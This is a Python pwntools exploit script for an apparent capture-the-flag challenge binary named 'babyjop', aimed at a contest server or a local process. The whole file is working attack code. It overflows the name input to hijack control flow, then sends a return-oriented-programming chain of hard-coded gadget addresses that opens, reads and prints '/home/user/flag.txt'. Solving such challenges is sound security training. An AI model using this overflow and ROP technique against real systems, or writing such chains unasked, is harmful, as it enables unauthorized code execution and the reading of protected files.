#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'

exe = ELF('./babyjop')

host, port = "remote1.thcon.party", "10902"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef/gef.py
    b *0x401eb3
    c
     ''')
  else:
    p = process(exe.path)

mprotect = 0x4522c0
gadget1 = 0x00000000004018ca # pop rdi ; ret
gadget2 = 0x00000000004017cf # pop rdx ; ret
gadget3 = 0x000000000040f4fe # pop rsi ; ret
gadget4 = 0x00000000004167b3 # jmp rsp

p.sendlineafter('age: \n', '1')

payload = 'A'*128+p32(0x401e8a)

p.sendafter('name: ', payload)

fd = 5
payload2 =  '/home/user/flag.txt\x00'.ljust(88,'\x00')+p64(gadget1)+p64(0x4c3300)+p64(gadget3)+p64(0)+p64(gadget2)+p64(0x0000000000452781)+p64(0x451350)+p64(gadget1)+p64(fd)+p64(gadget3)+p64(0x4c3300)+p64(gadget2)+p64(0x100)+p64(0x451480)+p64(gadget1)+p64(1)+p64(gadget2)+p64(0x100)+p64(0x451520)+p64(0x4102b0)
p.send(payload2)

p.interactive()

